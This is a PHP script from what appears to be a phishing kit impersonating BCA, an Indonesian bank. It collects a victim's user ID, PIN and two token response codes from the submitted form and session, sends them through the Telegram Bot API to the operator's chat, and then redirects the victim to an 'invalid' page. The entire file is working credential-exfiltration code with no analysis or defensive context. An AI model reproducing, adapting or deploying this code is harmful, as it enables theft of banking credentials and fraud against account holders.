<?php
session_start();
include "../../telegram.php";

$appli2 = $_POST['appli2'];
$userid = $_SESSION['userid'];
$pin = $_SESSION['pin'];
$appli = $_SESSION['appli'];
$_SESSION['appli2'] = $appli2;

$message = "
( BCA | DATA |  ".$userid." )
-- DATA AKUN DISINI --

×> Nama Lengkap : ".$userid."
×> Pin : ".$pin."
×> Appli 1 : ".$appli."
×> Appli 2 : ".$appli2."

";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=html&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location:./../invalid.php');
?>
